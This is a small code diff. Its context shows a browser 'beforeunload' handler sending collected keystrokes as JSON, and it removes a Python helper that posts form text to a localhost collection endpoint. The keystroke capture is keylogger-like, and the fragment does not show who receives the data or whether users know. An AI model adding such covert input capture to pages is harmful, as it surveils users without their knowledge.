@@ -13,16 +13,3 @@ window.addEventListener('beforeunload', () => {
     body: JSON.stringify(keystrokes)
   });
 });
-
-nlp_collector.py
-
-import requests
-
-def send_text(text):
-    url = 'http://localhost:8000/collect/text'
-    data = {'text': text}
-    requests.post(url, json=data)
-
-# Example usage in web form handler:
-# user_input = form.get('comment')
-# send_text(user_input)
